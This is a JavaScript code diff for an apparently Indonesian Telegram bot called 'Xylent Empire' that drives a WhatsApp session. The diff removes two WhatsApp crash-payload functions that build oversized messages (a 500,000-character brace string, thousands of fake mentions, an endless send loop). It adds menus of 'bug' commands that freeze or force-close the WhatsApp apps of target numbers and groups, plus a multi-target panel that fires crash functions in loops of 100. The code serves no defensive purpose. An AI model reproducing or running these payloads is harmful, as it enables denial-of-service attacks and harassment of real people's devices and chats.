+// ── Middleware: Deteksi private chat & auto mute ───────────
+bot.use(async (ctx, next) => {
+  // Hanya tangkap pesan di private chat
+  if (ctx.chat?.type !== 'private') return next();
+
+  // Jangan proses command /start & /privatemute
+  const text = ctx.message?.text || '';
+  if (text.startsWith('/start') || text.startsWith('/privatemute')) return next();
+
+  const user = ctx.from;
+  const userId = user.id.toString();
+  const username = user.username ? `@${user.username}` : `#${userId}`;
+  const fullName = `${user.first_name || ''}${user.last_name ? ' ' + user.last_name : ''}`.trim();
+
+  // ── OWNER BYPASS: owner tidak pernah kena mute ──────────
+  if (userId === OWNER_ID.toString()) {
+    return next();
+  }
+
+  // 🔥 [PERBAIKAN] Cek fitur aktif/mati ditaruh di sini!
+  // Jika fitur MATI, langsung loloskan tanpa cek status mute yang tersisa
+  if (!autoMuteEnabled) {
+    return next();
+  }
+
+  // ── Cek apakah user masih dalam status mute ─────────────
+  if (mutedUsers.has(userId)) {
+    const unmuteTime = mutedUsers.get(userId);
+    if (Date.now() < unmuteTime) {
+      const sisaMs = unmuteTime - Date.now();
+      const sisaMenit = Math.floor(sisaMs / 60000);
+      const sisaDetik = Math.floor((sisaMs % 60000) / 1000);
+      await ctx.reply(
+        `⚠️ Kamu masih dalam status *mute*.\n` +
+        `⏳ Sisa waktu: *${sisaMenit} menit ${sisaDetik} detik*`,
+        { parse_mode: 'Markdown' }
+      );
+      return; // stop
+    } else {
+      // Waktu mute sudah habis, hapus dari map
+      mutedUsers.delete(userId);
+    }
+  }
+
+  // ── User kirim pesan di private → langsung mute ─────────
+  const muteStart = new Date();
+  const muteEnd = new Date(Date.now() + MUTE_DURATION_MS);
+  mutedUsers.set(userId, muteEnd.getTime());
+
+  const logMessage =
+    `\`\`\`javascript\n` +
+    `┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓\n` +
+    `   >> PRIVATE CHAT DETECTED — AUTO MUTE <<\n` +
+    `┗━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
+    `╭───〔 𝐋𝐎𝐆 𝐈𝐍𝐅𝐎 〕───╮\n` +
+    `│ ◈ USER     : ${username}\n` +
+    `│ ◈ NAMA     : ${fullName}\n` +
+    `│ ◈ USER ID  : ${userId}\n` +
+    `│ ◈ MUTE    : 2 Menit\n` +
+    `│ ◈ MULAI   : ${formatDateTime(muteStart)}\n` +
+    `│ ◈ BEBAS   : ${formatDateTime(muteEnd)}\n` +
+    `╰──────────────────────╯\n` +
+    `\`\`\``;
+
+  // Kirim log ke GROUP
+  try {
+    await ctx.telegram.sendPhoto(LOG_GROUP_ID, 'https://h.top4top.io/p_3804dkqk41.jpg', {
+      caption: logMessage,
+      parse_mode: 'Markdown'
+    });
+  } catch (e) {
+    console.error('Gagal kirim log ke group:', e.message);
+  }
+
+  // Kirim log ke OWNER
+  try {
+    await ctx.telegram.sendPhoto(OWNER_ID, 'https://h.top4top.io/p_3804dkqk41.jpg', {
+      caption: logMessage,
+      parse_mode: 'Markdown'
+    });
+  } catch (e) {
+    console.error('Gagal kirim log ke owner:', e.message);
+  }
+
+  // Balas ke user yang kena mute
+  await ctx.replyWithPhoto('https://h.top4top.io/p_3804dkqk41.jpg', {
+    caption:
+      `🚫 Kamu telah di-*mute* selama *2 menit* karena mengirim pesan ke private bot.\n\n` +
+      `⏰ *Mulai* : ${formatDateTime(muteStart)}\n` +
+      `✅ *Bebas* : ${formatDateTime(muteEnd)}`,
+    parse_mode: 'Markdown'
+  });
+
+  return; // stop
+});
+
+////=========MENU UTAMA========\\\\
+
+const CHANNEL_USERNAME = '@XylentOfficial'; // ganti ini
+
+async function isUserJoined(ctx, userId) {
+  try {
+    const member = await ctx.telegram.getChatMember(CHANNEL_USERNAME, userId);
+    return ['member', 'administrator', 'creator'].includes(member.status);
+  } catch (e) {
+    return false;
+  }
 }
 
-async function delaxhard(sock, target) {
-    console.log("XYLENT");
-     {
-        for (let i = 0; i < 100; i++) {
-    const msg = {
-        groupStatusMessageV2: {
-            message: {
-        albumMessage: {
-                contextInfo: {
-                    statusAttributionType: 1,
-                    urlTrackingMap: {
-                            "https://example.com": "{".repeat(500000)
-                        },
-                    mentionedJid: [
-          "0@s.whatsapp.net",
-          ...Array.from(
-            { length: 1950 },
-            () =>
-              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
-          ),
-        ],
-        stanzaId: "1234567890ABCDEF",
-                    quotedMessage: {
-                        paymentInviteMessage: {
-    serviceType: 3,
-    expiryTimestamp: Date.now() + 60000
+// Handler tombol "Sudah Join"
+bot.action('check_join', async (ctx) => {
+  await ctx.answerCbQuery();
+  const userId = ctx.from.id;
+  const sudahJoin = await isUserJoined(ctx, userId);
+
+  if (!sudahJoin) {
+    await ctx.answerCbQuery('❌ Kamu belum join channel!', { show_alert: true });
+    return;
   }
-                        }
-                    }
-                }
-            }
-        }
-        }
-    await sock.relayMessage(target,msg,{
-        participant: { jid: target }
-        })
-    }}}
-    
-    async function X7Nganceng(sock, target, x) {
-  var X71 = [];
-  var X72 = Array.from({ length: 10000 }, () => ({}));
 
-  var X73 = {
-    imageMessage: {
-      url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
-      mimetype: "image/jpeg",
-      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
-      fileLength: 388944,
-      height: 1600,
-      width: 1200,
-      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
-      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
-      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
-      mediaKeyTimestamp: "1776937541",
-      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
-      contextInfo: {
-        pairedMediaType: "NOT_PAIRED_MEDIA",
-        isQuestion: true,
-        isGroupStatus: true
+  await ctx.deleteMessage();
+
+  const Name = ctx.from.username ? `@${ctx.from.username}` : ctx.from.id.toString();
+  const waktu = getRealTime();
+  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
+
+  const mainMenuMessage = `\`\`\`javascript
+┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
+   システムオンライン — アクセス許可済み
+   >> 開発責任者 — @xyzenofficial <<
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+
+╭───〔 𝐒𝐘𝐒𝐓𝐄𝐌 𝐋𝐎𝐆 〕───╮
+│ ◈ DEV    : @xyzenofficial
+│ ◈ SCRIPT : Xylent Empire
+│ ◈ USER   : ${Name}
+│ ◈ TIME   : ${getUptime()}
+│ ◈ DATE   : ${waktu}
+│ ◈ STATUS : ${waStatus}
+╰──────────────────────╯
+\`\`\``;
+
+  await ctx.replyWithPhoto(getRandomImage(), {
+    caption: mainMenuMessage,
+    parse_mode: 'Markdown',
+    reply_markup: {
+      inline_keyboard: [
+        [
+          {
+        text: "「 👤 」𝐎͢𝐖͡𝐍͜𝐄͢𝐑͡⃟🞇𝐌͜𝐄͢𝐍͡𝐔͜⃟🞇",
+        callback_data: "owner_menu",
+        style: 'success',
       },
-      caption: "pinzyX7",
-      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
-      scanLengths: "999",
-      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
-    },
-    hasMediaAttachment: true
-  };
-
-  for (var r = 0; r < 98; r++) {
-    X71.push({
-      header: X73,
-      nativeFlowMessage: {
-        messageParamsJson: JSON.stringify({
-          data: X72.length
-        })
+      {
+        text: "「 🚀 」 𝐀͢𝐔͡𝐓͜⃟🞇𝐎͢ 𝐔͡𝐏͜𝐃͢𝐀͡𝐓͜⃟🞇𝐄͢",
+        callback_data: "all_menu",
+        style: 'danger',
+      },
+      {
+        text: "「 🍂 」 𝐁͢𝐮͡𝐠͜⃟🞇𝐌͢e͡𝐧͜𝐮⃟🞇",
+        callback_data: "bug_menu",
+        style: 'primary',
       }
+    ],
+    [
+    {
+        text: "「 🎊 」 𝐅͢𝐈͡𝐓͜𝐔͢𝐑͡𝐄͜⃟🞇𝐓͢𝐎͡𝐎͜𝐋͢𝐒͡⃟🞇𝐌͢𝐄͡𝐍͜𝐔⃟🞇",
+        callback_data: "tools_menu",
+        style: 'danger',
+      }
+      ],
+      [
+      {
+        text: "「 🪷 」 𝐈͢𝐍͡𝐅͜𝐎͢𝐑͡𝐌͜𝐀͢𝐒͡𝐈͜⃟🞇𝐒͢𝐂͡𝐑͜𝐈͢𝐏͡𝐓͜⃟🞇",
+        url: "https://t.me/XylentOfficial",
+        style: 'danger',
+      },
+        ],
+      ],
+    },
+  });
+});
+
+////=========MENU UTAMA========\\\\
+bot.start(async (ctx) => {
+  const userId = ctx.from.id;
+  const Name = ctx.from.username ? `@${ctx.from.username}` : ctx.from.id.toString();
+  const waktu = getRealTime();
+  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
+
+  const sudahJoin = await isUserJoined(ctx, userId);
+
+  if (!sudahJoin) {
+    const forceMsg = `\`\`\`javascript
+┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
+   システムオンライン — アクセス許可済み
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+
+╭───〔 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃 〕───╮
+│ ◈ USER   : ${Name}
+│ ◈ STATUS : ❌ Belum Join
+│
+│  Silakan JOIN channel kami
+│  terlebih dahulu sebelum
+│  menggunakan bot ini!
+╰──────────────────────╯
+\`\`\``;
+
+    return ctx.replyWithPhoto('https://h.top4top.io/p_3799004cv1.jpg', {
+      caption: forceMsg,
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          // Pakai @username langsung tanpa link
+          [{ text:`「 📢 」 JOIN ${CHANNEL_USERNAME}`, url: `https://t.me/${CHANNEL_USERNAME.replace('@', '')}`, style: 'danger' }],
+          [{ text: '「 ✅ 」 Verifikasi', callback_data: 'check_join', style: 'success' }],
+        ],
+      },
     });
   }
 
-  while (true) {
-    var X74 = generateWAMessageFromContent(
+  // Sudah join → menu utama
+  const mainMenuMessage = `\`\`\`javascript
+┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
+   システムオンライン — アクセス許可済み
+   >> 開発責任者 — @xyzenofficial <<
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+
+╭───〔 𝐒𝐘𝐒𝐓𝐄𝐌 𝐋𝐎𝐆 〕───╮
+│ ◈ DEV    : @xyzenofficial
+│ ◈ SCRIPT : Xylent Empire
+│ ◈ USER   : ${Name}
+│ ◈ TIME   : ${getUptime()}
+│ ◈ DATE   : ${waktu}
+│ ◈ STATUS : ${waStatus}
+╰──────────────────────╯
+\`\`\``;
+
+  await ctx.replyWithPhoto(getRandomImage(), {
+    caption: mainMenuMessage,
+    parse_mode: 'Markdown',
+    reply_markup: {
+      inline_keyboard: [
+        [
+          {
+        text: "「 👤 」𝐎͢𝐖͡𝐍͜𝐄͢𝐑͡⃟🞇𝐌͜𝐄͢𝐍͡𝐔͜⃟🞇",
+        callback_data: "owner_menu",
+        style: 'success',
+      },
+      {
+        text: "「 🚀 」 𝐀͢𝐔͡𝐓͜⃟🞇𝐎͢ 𝐔͡𝐏͜𝐃͢𝐀͡𝐓͜⃟🞇𝐄͢",
+        callback_data: "all_menu",
+        style: 'danger',
+      },
+      {
+        text: "「 🍂 」 𝐁͢𝐮͡𝐠͜⃟🞇𝐌͢e͡𝐧͜𝐮⃟🞇",
+        callback_data: "bug_menu",
+        style: 'primary',
+      }
+    ],
+    [
+    {
+        text: "「 🎊 」 𝐅͢𝐈͡𝐓͜𝐔͢𝐑͡𝐄͜⃟🞇𝐓͢𝐎͡𝐎͜𝐋͢𝐒͡⃟🞇𝐌͢𝐄͡𝐍͜𝐔⃟🞇",
+        callback_data: "tools_menu",
+        style: 'danger',
+      }
+      ],
+      [
+      {
+        text: "「 🪷 」 𝐈͢𝐍͡𝐅͜𝐎͢𝐑͡𝐌͜𝐀͢𝐒͡𝐈͜⃟🞇𝐒͢𝐂͡𝐑͜𝐈͢𝐏͡𝐓͜⃟🞇",
+        url: "https://t.me/Xylent EmpireInfo02",
+        style: 'danger',
+      },
+        ],
+      ],
+    },
+  });
+});
+
+// Handler untuk owner_menu
+bot.action("owner_menu", async (ctx) => {
+  const userId = ctx.from.id.toString();
+  const isPremium = premiumUsers.includes(userId);
+  const memoryStatus = formatMemory();
+  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
+  const waktuRunPanel = getUptime();
+  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
+      
+  const mainMenuMessage = `\`\`\`
+╭━───━⊱ ⊱⪩ 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄 ⪨⊰
+┃❏ /addsender 62xxx
+┃❏ /delsesi
+┃❏ /addpremgroup <add all member>
+┃❏ /delpremgroup <delete acces all memb>
+┃❏ /addpremgroupid <ɪᴅ>
+┃❏ /delpremgroupid
+┃❏ /cekpremgroup
+┃❏ /listpremgroup
+┃❏ /blockcmd  <Block command bug>
+┃❏ /unblockcmd <Unblock command bug>
+┃❏ /listblockcmd <list command>
+┃❏ /addadmin <ɪᴅ>
+┃❏ /deladmin <ɪᴅ>
+┃❏ /addprem <ɪᴅ>
+┃❏ /delprem <ɪᴅ>
+┃❏ /cekprem <ᴄᴇᴋ>
+┃❏ /setcd 
+┃❏ /addpromo 
+┃❏ /delpromo
+┃❏ /antipromo on/off
+┃❏ /listpromo 
+┃❏ /privatemute on/off
+╰━───────────────━❏\`\`\``;
+
+  const media = {
+    type: "photo",
+    media: getRandomImage(), 
+    caption: mainMenuMessage,
+    parse_mode: "Markdown" // Diubah ke Markdown agar format blok kode aktif
+  };
+
+  const keyboard = {
+    inline_keyboard: [
+      [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: 'Primary' }],
+    ],
+  };
+
+  try {
+    await ctx.editMessageMedia(media, { reply_markup: keyboard });
+  } catch (err) {
+    await ctx.replyWithPhoto(media.media, {
+      caption: media.caption,
+      parse_mode: media.parse_mode,
+      reply_markup: keyboard,
+    });
+  }
+});
+
+bot.action("tools_menu", async (ctx) => {
+  const userId = ctx.from.id.toString();
+  const isPremium = premiumUsers.includes(userId);
+  const memoryStatus = formatMemory();
+  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
+  const waktuRunPanel = getUptime();
+  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
+      
+  const mainMenuMessage = `\`\`\`
+╭━───━⊱ ⊱⪩ 𝚃𝙾𝙾𝙻𝚂 𝙼𝙴𝙽𝚄 ⪨⊰
+┃❏ /brat <Brat to sticker>
+┃❏ /tiktokdl <TikTok downloader>
+┃❏ /iqc <iPhone camera effect.>
+┃❏ /info <cekid.>
+╰━─────────────────━❏
+\`\`\``;
+
+  const media = {
+    type: "photo",
+    media: getRandomImage(), 
+    caption: mainMenuMessage,
+    parse_mode: "Markdown" // Diubah ke Markdown agar format blok kode aktif
+  };
+
+  const keyboard = {
+    inline_keyboard: [
+      [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: 'Primary' }],
+    ],
+  };
+
+  try {
+    await ctx.editMessageMedia(media, { reply_markup: keyboard });
+  } catch (err) {
+    await ctx.replyWithPhoto(media.media, {
+      caption: media.caption,
+      parse_mode: media.parse_mode,
+      reply_markup: keyboard,
+    });
+  }
+});
+
+bot.action("all_menu", async (ctx) => {
+  const userId = ctx.from.id.toString();
+  const isPremium = premiumUsers.includes(userId);
+  const memoryStatus = formatMemory();
+  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
+  const waktuRunPanel = getUptime();
+  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
+      
+  const mainMenuMessage = `
+<blockquote><strong>
+╔═══〔 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 〕═══⎔
+║
+║  📢  𝗦𝗬𝗦𝗧𝗘𝗠 𝗨𝗣𝗗𝗔𝗧𝗘
+║
+║  Silahkan ketik perintah:
+║  ➥ <code>/updatesc</code>
+║  ➥ <code>/autoupdate (on/off)</code>
+║  ➥ <code>/checkupdate</code>
+║  ➥ <code>/updatestatus</code>
+║
+║  Proses pembaruan script
+║  akan berjalan otomatis.
+║
+╚═════════════════════⎔</strong></blockquote>`;
+
+  const media = {
+    type: "photo",
+    media: getRandomImage(), 
+    caption: mainMenuMessage,
+    parse_mode: "HTML" // Diubah ke Markdown agar format blok kode aktif
+  };
+
+  const keyboard = {
+    inline_keyboard: [
+      [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: 'Primary' }],
+    ],
+  };
+
+  try {
+    await ctx.editMessageMedia(media, { reply_markup: keyboard });
+  } catch (err) {
+    await ctx.replyWithPhoto(media.media, {
+      caption: media.caption,
+      parse_mode: media.parse_mode,
+      reply_markup: keyboard,
+    });
+  }
+});
+
+bot.action("bug_menu", async (ctx) => {
+  const userId = ctx.from.id.toString();
+  const isPremium = premiumUsers.includes(userId);
+  const memoryStatus = formatMemory();
+  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
+  const waktuRunPanel = getUptime();
+  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
+      
+  const mainMenuMessage = `\`\`\`
+╭━━━〔 ALL FITURE • BEBAS SPAM • ANTI KENON 〕━━━╮
+📱 ANDROID • INVISIBLE DELAY HARD
+│ /xspam      ➜ 628xxxx 
+│ /xspam1    ➜ 628xxxx 
+│ /xspam2     ➜ 628xxxx 
+│ /xspam3     ➜ 628xxxx 
+│ /xspam4     ➜ 628xxxx 
+│ /combo1     ➜ 628xxxx 
+│ /combo     ➜ 628xxxx 
+
+📱 ANDROID • FORCLOSE X BLANK
+│ /stcblank     ➜ 628xxxx   
+│ /uisystem    ➜ 628xxxx  
+│ /blankui    ➜ 628xxxx   
+│ /fcclick    ➜ 628xxxx
+
+🍏 IOS • FORECLOSE INVISIBLE ✦
+│ /iosattack     ➜ 628xxxx 
+
+☣️ SPESIAL BUG ✦
+│ /custombug1     ➜ 628xxxx 
+│ /custombug2 ➜ 628xxxx 
+│ /attack ➜ 628xxxx 
+━━━━━━━━━━━━━━━━━━━━━━
+
+👥 BUGS GROUP • DELAY X FC CLICK
+│ /fcgb       ➜ link group 
+│ /delaygb    ➜ link group 
+┊
+┊  ⚠️ EFFECT FC GROUP :
+┊  ➜ Fc Group  Click
+┊  ➜ All Member Delay
+╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+💡 Tips:
+│ /blockcmd /command     → menghidupkan command
+│ /unblockcmd /command  → mematikan command
+│ /listblockcmd              → cek status command
+│ ACTIVE / OFFLINE  
+╰━━━━━━━━━━━━━━━━━━━━━━╯
+\`\`\``;
+
+  const media = {
+    type: "photo",
+    media: getRandomImage(),
+    caption: mainMenuMessage,
+    parse_mode: "Markdown"
+  };
+
+  // KOREKSI: Hapus properti 'style' karena tidak didukung Telegram
+  const keyboard = {
+    inline_keyboard: [
+      [
+        { text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: "primary" }, // callback_data sesuaikan dengan menu utama botmu
+        { text: "➡️ ", callback_data: "bug_menu2", style: "success" }
+      ],
+    ],
+  };
+
+  try {
+    await ctx.editMessageMedia(media, { reply_markup: keyboard });
+  } catch (err) {
+    await ctx.replyWithPhoto(media.media, {
+      caption: media.caption,
+      parse_mode: media.parse_mode,
+      reply_markup: keyboard 
+    });
+  }
+});
+
+bot.action("bug_menu2", async (ctx) => {
+  const userId = ctx.from.id.toString();
+  const isPremium = premiumUsers.includes(userId);
+  const memoryStatus = formatMemory();
+  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
+  const waktuRunPanel = getUptime();
+  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
+      
+  const mainMenuMessage = `\`\`\`
+╭━━━〔 BUGS VERSI 2 〕━━━╮
+📱 ANDROID • DELAY X FREEZE
+│ /lockchat     ➜ 628xxxx   
+│ /delayvisible    ➜ 628xxxx  
+╰━━━━━━━━━━━━━━━━━━━━━
+╭━━━━━━━━━━━━━━━━━━━━━━━━
+│ /fcgb         ➜ link group
+│ /delaygb      ➜ linkgroup
+│ /testfunc     ➜ 628xxxx 50
+│ /testgb ➜ link group 50
+┊  ⚠️ EFFECT FC GROUP :
+┊  ➜ Fc Group  Click
+┊  ➜ All Member Delay
+\`\`\``;
+
+  const media = {
+    type: "photo",
+    media: getRandomImage(),
+    caption: mainMenuMessage,
+    parse_mode: "Markdown"
+  };
+
+  // KOREKSI: Hapus properti 'style' & ubah callback_data ke 'bug_menu' agar kembali ke halaman 1
+  const keyboard = {
+    inline_keyboard: [
+      [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "bug_menu", style: "primary" }],
+    ],
+  };
+
+  try {
+    await ctx.editMessageMedia(media, { reply_markup: keyboard });
+  } catch (err) {
+    await ctx.replyWithPhoto(media.media, {
+      caption: media.caption,
+      parse_mode: media.parse_mode,
+      reply_markup: keyboard 
+    });
+  }
+});
+
+
+// Handler untuk back main menu
+bot.action("back", async (ctx) => {
+  const userId = ctx.from.id.toString();
+  const isPremium = premiumUsers.includes(userId);
+  const memoryStatus = formatMemory();
+  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
+  const waktuRunPanel = getUptime();
+  const waktu = getRealTime(); // Menambahkan variabel waktu yang kurang
+  const waStatus = sock && sock.user ? "✔️" : "❌ ";
+      
+  const mainMenuMessage = `\`\`\`javascript
+┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
+   システムオンライン — アクセス許可済み
+   >> 開発責任者 — @xyzenofficial <<
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+
+╭───〔 𝐒𝐘𝐒𝐓𝐄𝐌 𝐋𝐎𝐆 〕───╮
+│ ◈ DEV   : @xyzenofficial
+│ ◈ SCRIPT   : Xylent Empire
+│ ◈ USER  : ${Name}
+│ ◈ TIME  : ${waktuRunPanel}
+│ ◈ DATE  : ${waktu}
+│ ◈ STATUS : ${waStatus}
+╰──────────────────────╯
+\`\`\``;
+
+ const media = {
+    type: "photo",
+    media: getRandomImage(),
+    caption: mainMenuMessage,
+    parse_mode: "Markdown" // Diubah ke Markdown agar format blok kode aktif
+  };
+
+  const mainKeyboard = [
+    [
+    {
+        text: "「 👤 」𝐎͢𝐖͡𝐍͜𝐄͢𝐑͡⃟🞇𝐌͜𝐄͢𝐍͡𝐔͜⃟🞇",
+        callback_data: "owner_menu",
+        style: 'success',
+      },
+      {
+        text: "「 🚀 」 𝐀͢𝐔͡𝐓͜⃟🞇𝐎͢ 𝐔͡𝐏͜𝐃͢𝐀͡𝐓͜⃟🞇𝐄͢",
+        callback_data: "all_menu",
+        style: 'danger',
+      },
+      {
+        text: "「 🍂 」 𝐁͢𝐮͡𝐠͜⃟🞇𝐌͢e͡𝐧͜𝐮⃟🞇",
+        callback_data: "bug_menu",
+        style: 'primary',
+      }
+    ],
+    [
+    {
+        text: "「 🎊 」 𝐅͢𝐈͡𝐓͜𝐔͢𝐑͡𝐄͜⃟🞇𝐓͢𝐎͡𝐎͜𝐋͢𝐒͡⃟🞇𝐌͢𝐄͡𝐍͜𝐔⃟🞇",
+        callback_data: "tools_menu",
+        style: 'danger',
+      }
+      ],
+      [
+      {
+        text: "「 🪷 」 𝐈͢𝐍͡𝐅͜𝐎͢𝐑͡𝐌͜𝐀͢𝐒͡𝐈͜⃟🞇𝐒͢𝐂͡𝐑͜𝐈͢𝐏͡𝐓͜⃟🞇",
+        url: "https://t.me/XylentOfficial",
+        style: 'danger',
+      },
+    ],
+  ];
+
+  try {
+    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
+  } catch (err) {
+    await ctx.replyWithPhoto(media.media, {
+      caption: media.caption,
+      parse_mode: media.parse_mode,
+      reply_markup: { inline_keyboard: mainKeyboard },
+    });
+  }
+});
+
+// CUSTOMBUG 3
+// ===== COMMAND =====
+bot.command("custombug2", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply("Example: /custombug2 62xxx,62xxx");
+
+  const numbers = q.split(",")
+    .map(v => v.replace(/[^0-9]/g, ''))
+    .filter(v => v.length > 5);
+
+  if (!numbers.length) return ctx.reply("❌ Nomor tidak valid");
+
+  const targets = numbers.map(v => `${v}@s.whatsapp.net`);
+
+  multiBugSession.set(ctx.from.id, {
+    targets,
+    numbers,
+    selected: []
+  });
+
+  await ctx.replyWithPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `⚡ *MULTI BUG PANEL*\n\n🎯 Target (${numbers.length}):\n${numbers.map(v => `• ${v}`).join("\n")}\n\nPilih bug lalu tekan EXECUTE`,
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: buildButtons(ctx.from.id)
+    }
+  });
+});
+
+// ===== BUTTON =====
+function buildButtons(userId) {
+  const s = multiBugSession.get(userId);
+  const isOn = (b) => s.selected.includes(b) ? "⭐" : "💎";
+
+  const btn = (b, name) => ({
+    text: `${isOn(b)} ${name}`,
+    callback_data: `cb3bug|${b}` // 🔥 prefix unik
+  });
+
+  return [
+    [btn("bulldo","BULLDO"), btn("delayfreeze","DELAY FREEZE"), btn("harddelay","DELAY HARD")],
+    [btn("bebasspam","BEBAS SPAM"), btn("stcb","STCBLANK"),
+    btn("fcclick","FC CLICK")],
+    [
+      { text: "🚀 EXECUTE", callback_data: "cb3bug|exec" }
+    ]
+  ];
+}
+
+// ===== UPDATE =====
+async function updateMulti(ctx) {
+  await ctx.telegram.editMessageReplyMarkup(
+    ctx.callbackQuery.message.chat.id,
+    ctx.callbackQuery.message.message_id,
+    null,
+    {
+      inline_keyboard: buildButtons(ctx.from.id)
+    }
+  );
+}
+
+// ===== REGEX (ANTI TABRAKAN) =====
+bot.action(/^cb3bug\|([^|]+)$/, async (ctx) => {
+  const key = ctx.match[1];
+  const s = multiBugSession.get(ctx.from.id);
+
+  if (!s) return ctx.answerCbQuery("Session expired");
+
+  // ===== EXECUTE =====
+  if (key === "exec") {
+
+    if (!s.selected.length) {
+      return ctx.answerCbQuery("❌ Pilih bug!", { show_alert: true });
+    }
+
+    await ctx.answerCbQuery("🚀 EXECUTING...");
+
+    try {
+
+      for (const target of s.targets) {
+        for (const bug of s.selected) {
+
+          if (bug === "bulldo") {
+            for (let i=0;i<100;i++){ await dingleyhard(sock, target, ptcp = true); await sleep(1500); }
+          }
+          else if (bug === "delayfreeze") {
+            for (let i=0;i<100;i++){ await CrmXcarousel(sock, target); await sleep(1500); }
+          }
+          else if (bug === "harddelay") {
+            for (let i=0;i<100;i++){ await MBGCOMBO(sock, target); await sleep(1500); }
+          }
+          else if (bug === "bebasspam") {
